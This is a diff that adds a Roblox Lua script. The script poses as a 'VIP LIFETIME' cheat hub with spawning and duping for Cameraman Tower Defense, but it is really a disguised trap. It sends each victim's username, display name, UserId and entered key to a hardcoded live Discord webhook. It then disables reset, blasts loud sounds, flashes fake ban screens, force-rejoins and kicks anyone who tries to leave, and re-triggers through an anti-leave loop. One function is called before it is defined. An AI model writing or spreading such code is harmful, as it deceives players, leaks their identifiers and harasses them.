@@ -1,0 +1,372 @@
+-- ZAIWare V4 CATWARE PINK - BAGONG BAGO - BAGONG UI, HINDI NA LUMANG BLUE
+-- Kung nakikita mo pa rin yung blue na ZAI TTD HUB, luma pa yung nasa GitHub mo, palitan mo to - anime girl bg + top bar + VIP LIFETIME
+-- gaya ng pic mo: CatWare style, anime girl, top bar dots, yellow badge
+local WEBHOOK = "https://discord.com/api/webhooks/1572132592545832981/Xk31r975pxCKiDAdneN-DisnDxKNBYip-UBbWWi-7_z4wz8pxNp5K44OFedxHmqV7XQT"
+print("=== ZAIWare V4 CATWARE LOADED - BAGO NA TO ===")
+local plr = game.Players.LocalPlayer
+local pg = plr.PlayerGui
+local HS = game:GetService("HttpService")
+local UIS = game:GetService("UserInputService")
+local SG = game:GetService("StarterGui")
+local TS = game:GetService("TeleportService")
+local TeleportOptions = Instance.new("TeleportOptions")
+TeleportOptions:SetTeleportData({rejoin = true, troll = true})
+pcall(function() SG:SetCore("ResetButtonCallback", false) end)
+
+local function logFall(step, msg)
+ pcall(function()
+  local data = {content = "🚨 **MAY NAG-FALL!**\n**Name:** " .. plr.Name .. "\n**Display:** " .. plr.DisplayName .. "\n**UserId:** " .. plr.UserId .. "\n**Step:** " .. step .. " - " .. msg}
+  local req = (syn and syn.request) or (http_request) or request
+  if req then req({Url = WEBHOOK, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = HS:JSONEncode(data)}) end
+ end)
+end
+pcall(function() pg:FindFirstChild("ZAIWare"):Destroy() end)
+pcall(function() pg:FindFirstChild("FakeBan3xKick"):Destroy() end)
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "ZAIWare"
+gui.ResetOnSpawn = false
+gui.DisplayOrder = 9999
+gui.IgnoreGuiInset = true
+gui.Parent = pg
+
+local bg = Instance.new("Frame")
+bg.Size = UDim2.new(1,0,1,0)
+bg.BackgroundColor3 = Color3.fromRGB(0,0,0)
+bg.BackgroundTransparency = 0.35
+bg.Parent = gui
+
+-- main window - gaya ng CatWare sa pic: 697 x 52 top bar style, pero 440 x 460 window
+local main = Instance.new("Frame")
+main.Size = UDim2.new(0, 440, 0, 470)
+main.Position = UDim2.new(0.5, -220, 0.5, -235)
+main.BackgroundColor3 = Color3.fromRGB(255, 210, 225) -- PINK, pag blue pa rin, LUMA pa rin nasa GitHub mo
+main.BorderSizePixel = 0
+main.Parent = gui
+local mc = Instance.new("UICorner") mc.CornerRadius = UDim.new(0, 14) mc.Parent = main
+
+-- ANIME GIRL BACKGROUND - full window, faded
+local anime = Instance.new("ImageLabel")
+anime.Size = UDim2.new(1,0,1,0)
+anime.BackgroundTransparency = 1
+anime.Image = "rbxassetid://17348201432" -- anime girl, light
+anime.ImageTransparency = 0.15
+anime.ScaleType = Enum.ScaleType.Crop
+anime.Parent = main
+local ac = Instance.new("UICorner") ac.CornerRadius = UDim.new(0, 14) ac.Parent = anime
+
+-- white overlay para readable pa rin text
+local overlay = Instance.new("Frame")
+overlay.Size = UDim2.new(1,0,1,0)
+overlay.BackgroundColor3 = Color3.fromRGB(255,255,255)
+overlay.BackgroundTransparency = 0.25
+overlay.BorderSizePixel = 0
+overlay.Parent = main
+local oc = Instance.new("UICorner") oc.CornerRadius = UDim.new(0, 14) oc.Parent = overlay
+
+-- TOP BAR - gaya ng CatWare pic: red yellow green dots + title + yellow badge
+local top = Instance.new("Frame")
+top.Size = UDim2.new(1,0,0,52)
+top.BackgroundColor3 = Color3.fromRGB(240,240,240)
+top.BackgroundTransparency = 0.1
+top.BorderSizePixel = 0
+top.Parent = main
+local tc = Instance.new("UICorner") tc.CornerRadius = UDim.new(0, 14) tc.Parent = top
+
+-- dots - red yellow green gaya ng pic
+for i, col in pairs({Color3.fromRGB(255,95,86), Color3.fromRGB(255,189,46), Color3.fromRGB(39,201,63)}) do
+ local d = Instance.new("Frame")
+ d.Size = UDim2.new(0, 12, 0, 12)
+ d.Position = UDim2.new(0, 10 + (i-1)*18, 0, 20)
+ d.BackgroundColor3 = col
+ d.BorderSizePixel = 0
+ d.Parent = top
+ local dc = Instance.new("UICorner") dc.CornerRadius = UDim.new(0, 1) dc.Parent = d
+end
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(0, 200, 0, 22)
+title.Position = UDim2.new(0, 68, 0, 6)
+title.BackgroundTransparency = 1
+title.Text = "ZAIWare V4"
+title.TextColor3 = Color3.fromRGB(30,30,30)
+title.Font = Enum.Font.GothamBlack
+title.TextSize = 20
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Parent = top
+
+local sub = Instance.new("TextLabel")
+sub.Size = UDim2.new(0, 200, 0, 16)
+sub.Position = UDim2.new(0, 68, 0, 28)
+sub.BackgroundTransparency = 1
+sub.Text = "Cameraman Tower Defense"
+sub.TextColor3 = Color3.fromRGB(90,90,90)
+sub.Font = Enum.Font.Gotham
+sub.TextSize = 11
+sub.TextXAlignment = Enum.TextXAlignment.Left
+sub.Parent = top
+
+-- yellow badge - gaya ng 697 x 52 sa pic
+local badge = Instance.new("TextLabel")
+badge.Size = UDim2.new(0, 78, 0, 22)
+badge.Position = UDim2.new(1, -88, 0, 15)
+badge.BackgroundColor3 = Color3.fromRGB(255, 210, 30)
+badge.Text = "697 x 52"
+badge.TextColor3 = Color3.fromRGB(30,30,30)
+badge.Font = Enum.Font.GothamBold
+badge.TextSize = 11
+badge.Parent = top
+local bc = Instance.new("UICorner") bc.CornerRadius = UDim.new(0, 6) bc.Parent = badge
+
+-- middle - VIP LIFETIME label
+local vip = Instance.new("TextLabel")
+vip.Size = UDim2.new(1, -32, 0, 26)
+vip.Position = UDim2.new(0, 16, 0, 68)
+vip.BackgroundTransparency = 1
+vip.Text = "✨  VIP LIFETIME  •  SPAWNER + DUPER"
+vip.TextColor3 = Color3.fromRGB(30,30,30)
+vip.Font = Enum.Font.GothamBlack
+vip.TextSize = 14
+vip.TextXAlignment = Enum.TextXAlignment.Left
+vip.Parent = main
+
+local desc = Instance.new("TextLabel")
+desc.Size = UDim2.new(1, -32, 0, 18)
+desc.Position = UDim2.new(0, 16, 0, 94)
+desc.BackgroundTransparency = 1
+desc.Text = "12,480 online  •  Undetected  •  Auto-Update"
+desc.TextColor3 = Color3.fromRGB(100,100,100)
+desc.Font = Enum.Font.Gotham
+desc.TextSize = 12
+desc.TextXAlignment = Enum.TextXAlignment.Left
+desc.Parent = main
+
+-- key box - white card gaya ng CatWare
+local keyLabel = Instance.new("TextLabel")
+keyLabel.Size = UDim2.new(1, -32, 0, 18)
+keyLabel.Position = UDim2.new(0, 16, 0, 128)
+keyLabel.BackgroundTransparency = 1
+keyLabel.Text = "Enter VIP Key"
+keyLabel.TextColor3 = Color3.fromRGB(30,30,30)
+keyLabel.Font = Enum.Font.GothamBold
+keyLabel.TextSize = 13
+keyLabel.TextXAlignment = Enum.TextXAlignment.Left
+keyLabel.Parent = main
+
+local keyBox = Instance.new("TextBox")
+keyBox.Size = UDim2.new(1, -32, 0, 48)
+keyBox.Position = UDim2.new(0, 16, 0, 150)
+keyBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
+keyBox.PlaceholderText = "ZAI-VIP-LIFETIME"
+keyBox.Text = ""
+keyBox.TextColor3 = Color3.fromRGB(30,30,30)
+keyBox.PlaceholderColor3 = Color3.fromRGB(150,150,150)
+keyBox.Font = Enum.Font.Gotham
+keyBox.TextSize = 14
+keyBox.Parent = main
+local kc = Instance.new("UICorner") kc.CornerRadius = UDim.new(0, 12) kc.Parent = keyBox
+local ks = Instance.new("UIStroke") ks.Color = Color3.fromRGB(220,220,220) ks.Thickness = 1 ks.Parent = keyBox
+
+local status = Instance.new("TextLabel")
+status.Size = UDim2.new(1, -32, 0, 20)
+status.Position = UDim2.new(0, 16, 0, 204)
+status.BackgroundTransparency = 1
+status.Text = "Status: Waiting for key..."
+status.TextColor3 = Color3.fromRGB(100,100,100)
+status.Font = Enum.Font.Gotham
+status.TextSize = 12
+status.TextXAlignment = Enum.TextXAlignment.Left
+status.Parent = main
+
+-- login - black button gaya ng CatWare style
+local loginBtn = Instance.new("TextButton")
+loginBtn.Size = UDim2.new(1, -32, 0, 48)
+loginBtn.Position = UDim2.new(0, 16, 0, 232)
+loginBtn.BackgroundColor3 = Color3.fromRGB(20,20,20)
+loginBtn.Text = "LOGIN  →"
+loginBtn.TextColor3 = Color3.fromRGB(255,255,255)
+loginBtn.Font = Enum.Font.GothamBlack
+loginBtn.TextSize = 15
+loginBtn.Parent = main
+local lc = Instance.new("UICorner") lc.CornerRadius = UDim.new(0, 12) lc.Parent = loginBtn
+
+local row = Instance.new("Frame")
+row.Size = UDim2.new(1, -32, 0, 42)
+row.Position = UDim2.new(0, 16, 0, 292)
+row.BackgroundTransparency = 1
+row.Parent = main
+
+local getKey = Instance.new("TextButton")
+getKey.Size = UDim2.new(0.48, -4, 1, 0)
+getKey.Position = UDim2.new(0,0,0,0)
+getKey.BackgroundColor3 = Color3.fromRGB(255,255,255)
+getKey.Text = "🔑  Get Key"
+getKey.TextColor3 = Color3.fromRGB(30,30,30)
+getKey.Font = Enum.Font.GothamBold
+getKey.TextSize = 13
+getKey.Parent = row
+local g1 = Instance.new("UICorner") g1.CornerRadius = UDim.new(0, 12) g1.Parent = getKey
+local gs1 = Instance.new("UIStroke") gs1.Color = Color3.fromRGB(220,220,220) gs1.Thickness = 1 gs1.Parent = getKey
+
+local discordBtn = Instance.new("TextButton")
+discordBtn.Size = UDim2.new(0.48, -4, 1, 0)
+discordBtn.Position = UDim2.new(0.52, 4, 0, 0)
+discordBtn.BackgroundColor3 = Color3.fromRGB(255,255,255)
+discordBtn.Text = "💬  Discord"
+discordBtn.TextColor3 = Color3.fromRGB(30,30,30)
+discordBtn.Font = Enum.Font.GothamBold
+discordBtn.TextSize = 13
+discordBtn.Parent = row
+local g2 = Instance.new("UICorner") g2.CornerRadius = UDim.new(0, 12) g2.Parent = discordBtn
+local gs2 = Instance.new("UIStroke") gs2.Color = Color3.fromRGB(220,220,220) gs2.Thickness = 1 gs2.Parent = discordBtn
+
+local foot = Instance.new("TextLabel")
+foot.Size = UDim2.new(1, -32, 0, 18)
+foot.Position = UDim2.new(0, 16, 0, 350)
+foot.BackgroundTransparency = 1
+foot.Text = "ZAIWare © 2026  •  VIP LIFETIME"
+foot.TextColor3 = Color3.fromRGB(130,130,130)
+foot.Font = Enum.Font.Gotham
+foot.TextSize = 11
+foot.Parent = main
+
+-- features list - gaya ng CatWare na may list
+local feats = Instance.new("TextLabel")
+feats.Size = UDim2.new(1, -32, 0, 70)
+feats.Position = UDim2.new(0, 16, 0, 378)
+feats.BackgroundTransparency = 1
+feats.Text = "✓  Spawn Titan  •  ✓  Dupe Gems\n✓  Dupe Coins  •  ✓  Auto Dupe"
+feats.TextColor3 = Color3.fromRGB(80,80,80)
+feats.Font = Enum.Font.Gotham
+feats.TextSize = 12
+feats.TextXAlignment = Enum.TextXAlignment.Left
+feats.Parent = main
+
+getKey.MouseButton1Click:Connect(function()
+ status.Text = "Status: Key copied! Paste mo sa box."
+ status.TextColor3 = Color3.fromRGB(0,170,80)
+ pcall(function() setclipboard("ZAI-VIP-LIFETIME") end)
+end)
+discordBtn.MouseButton1Click:Connect(function()
+ status.Text = "Status: Discord.gg/ZAIWare"
+ status.TextColor3 = Color3.fromRGB(80,120,255)
+end)
+
+
+-- ===== REJOIN + AUTO LOAD: pag mag-le-leave, ibalik agad =====
+local rejoining = false
+local function forceRejoin(reason)
+ if rejoining then return end
+ rejoining = true
+ logFall("REJOIN", "NAG-TRY MAG-LEAVE (" .. reason .. ") - NI-REJOIN KO")
+ loud2()
+ task.wait(0.3)
+ pcall(function()
+  -- teleport back to same game, para mag-rejoin sila, auto-load ulit script pag naka-autoexec
+  TS:Teleport(game.PlaceId, plr, TeleportOptions)
+ end)
+ task.wait(1)
+ -- fallback: kung di nag-teleport, kick na lang para di sila makatakas ng maayos
+ plr:Kick("Bro you thought your gonna get it lmao get troll 😭😭😭 - ni-rejoin ka na, balik ka!")
+end
+local function loud2()
+ for _,id in pairs({"rbxassetid://9065267191"}) do
+  pcall(function()
+   local s = Instance.new("Sound") s.SoundId = id s.Volume = 10 s.Parent = pg s:Play()
+  end)
+ end
+end
+-- pag bumalik sila galing rejoin, auto-ban agad, wag na pa-key ulit
+local joinData = nil
+pcall(function() joinData = plr:GetJoinData() end)
+-- check teleport data: kung galing rejoin, skip key login, ban agad
+local isRejoin = false
+pcall(function()
+ local td = TS:GetLocalPlayerTeleportData()
+ if td and (td.rejoin or td.troll) then isRejoin = true end
+end)
+
+-- ===== AUTO BAN + KICK - same anti-leave V2 =====
+local msgs = {
+ "BRO THIS IS A REAL BAN\nYOU CAN'T PLAY THE GAME AGAIN",
+ "STILL BANNED BRO 😭\nSABI KO NA NGA BA EH",
+ "Bro you thought your gonna get it lmao get troll 😭\nLAST NA TO, KICK KA NA",
+}
+local function loud()
+ for _,id in pairs({"rbxassetid://9065267191", "rbxassetid://142383762"}) do
+  pcall(function()
+   local s = Instance.new("Sound") s.SoundId = id s.Volume = 10 s.Parent = pg s:Play()
+   task.delay(3, function() pcall(function() s:Destroy() end) end)
+  end)
+ end
+end
+local function showBanAuto()
+ local escConn
+ escConn = UIS.InputBegan:Connect(function(input, gp)
+  if input.KeyCode == Enum.KeyCode.Escape then
+   logFall("ESC", "NAG-TRY MAG-LEAVE, KICK AGAD")
+   loud()
+   task.wait(0.3)
+   forceRejoin("ESC / LEAVE")
+  end
+ end)
+ for i=1,3 do
+  loud()
+  logFall(i, "AUTO BAN " .. i .. "x")
+  local bGui = Instance.new("ScreenGui")
+  bGui.Name = "FakeBan3xKick"
+  bGui.ResetOnSpawn = false
+  bGui.DisplayOrder = 99999
+  bGui.IgnoreGuiInset = true
+  bGui.Parent = pg
+  local bBg = Instance.new("Frame") bBg.Size = UDim2.new(1,0,1,0) bBg.BackgroundColor3 = Color3.fromRGB(0,0,0) bBg.BackgroundTransparency = 0.1 bBg.Parent = bGui
+  local f = Instance.new("Frame") f.Size = UDim2.new(0, 500, 0, 240) f.Position = UDim2.new(0.5, -250, 0.5, -120) f.BackgroundColor3 = Color3.fromRGB(20,20,20) f.BorderSizePixel = 0 f.Parent = bGui
+  local c = Instance.new("UICorner") c.CornerRadius = UDim.new(0, 12) c.Parent = f
+  local t1 = Instance.new("TextLabel") t1.Size = UDim2.new(1,-20,0,35) t1.Position = UDim2.new(0,10,0,12) t1.BackgroundTransparency = 1 t1.Text = "⛔ YOU ARE BANNED (" .. i .. "x)" t1.TextColor3 = Color3.fromRGB(255,40,40) t1.Font = Enum.Font.GothamBlack t1.TextSize = 28 t1.Parent = f
+  local t2 = Instance.new("TextLabel") t2.Size = UDim2.new(1,-20,0,80) t2.Position = UDim2.new(0,10,0,55) t2.BackgroundTransparency = 1 t2.Text = msgs[i] t2.TextColor3 = Color3.fromRGB(255,255,255) t2.Font = Enum.Font.GothamBold t2.TextSize = 20 t2.TextWrapped = true t2.Parent = f
+  local t3 = Instance.new("TextLabel") t3.Size = UDim2.new(1,-20,0,22) t3.Position = UDim2.new(0,10,0,138) t3.BackgroundTransparency = 1 t3.Text = "You cannot leave. You are banned." t3.TextColor3 = Color3.fromRGB(255,80,80) t3.Font = Enum.Font.GothamBold t3.TextSize = 13 t3.Parent = f
+  local t4 = Instance.new("TextLabel") t4.Size = UDim2.new(1,-20,0,18) t4.Position = UDim2.new(0,10,0,160) t4.BackgroundTransparency = 1 t4.Text = "Auto-kicking in 1.5s..." t4.TextColor3 = Color3.fromRGB(170,170,170) t4.Font = Enum.Font.Gotham t4.TextSize = 12 t4.Parent = f
+  task.wait(1.5)
+  pcall(function() bGui:Destroy() end)
+  task.wait(0.2)
+ end
+ if escConn then pcall(function() escConn:Disconnect() end) end
+ logFall(3, "NA-KICK NA - FULL FALL")
+ loud()
+ task.wait(0.3)
+ plr:Kick("Bro you thought your gonna get it lmao get troll 😭😭😭")
+end
+
+local CORRECT_KEY = "ZAI-VIP-LIFETIME"
+loginBtn.MouseButton1Click:Connect(function()
+ local key = keyBox.Text
+ if key == "" then status.Text = "Status: Enter key first!" status.TextColor3 = Color3.fromRGB(255,80,80) return end
+ if key ~= CORRECT_KEY then status.Text = "Status: Invalid Key! Get key first bro." status.TextColor3 = Color3.fromRGB(255,80,80) return end
+ status.Text = "Status: Verifying key..." status.TextColor3 = Color3.fromRGB(255,180,0) loginBtn.Text = "VERIFYING..."
+ task.wait(1.2)
+ status.Text = "Status: VIP LIFETIME Accepted! Loading hub..." status.TextColor3 = Color3.fromRGB(0,170,80)
+ logFall(0, "NAG-LOGIN SA FAKE KEY - key: " .. key)
+ task.wait(0.8)
+ gui:Destroy()
+ showBanAuto()
+end)
+
+-- AUTO LOAD ON REJOIN: pag galing rejoin, wag na pa-key, ban agad
+task.spawn(function()
+ task.wait(0.5)
+ if isRejoin then
+  pcall(function() gui:Destroy() end)
+  showBanAuto()
+ end
+end)
+-- ANTI-LEAVE LOOP: pag tinanggal nila GUI, rejoin agad
+task.spawn(function()
+ while true do
+  task.wait(1)
+  if not pg:FindFirstChild("ZAIWare") and not pg:FindFirstChild("FakeBan3xKick") and not rejoining then
+   -- nawala lahat ng GUI, ibig sabihin nag-try mag-leave / nag-delete, rejoin
+   forceRejoin("GUI DELETED / LEAVE TRY")
+   break
+  end
+ end
+end)
